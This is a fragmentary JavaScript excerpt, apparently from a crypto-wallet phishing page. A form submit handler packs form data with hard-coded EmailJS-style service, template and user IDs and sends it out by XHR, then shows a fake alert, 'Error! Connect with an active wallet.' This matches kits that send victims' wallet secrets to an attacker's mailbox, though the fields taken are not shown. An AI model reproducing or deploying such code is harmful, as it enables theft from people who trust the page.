...
const sendData = async (data) => {
  ...
  XHR.addEventListener("load", function (event) {
    alert("Error! Connect with an active wallet.");
...
form.addEventListener("submit", async function (e) {
  ...
  FD.append("service_id", "service_7sdalwe");
  FD.append("template_id", "template_qy72g9a");
  FD.append("user_id", "eCordkeEQhgTe95Yp");
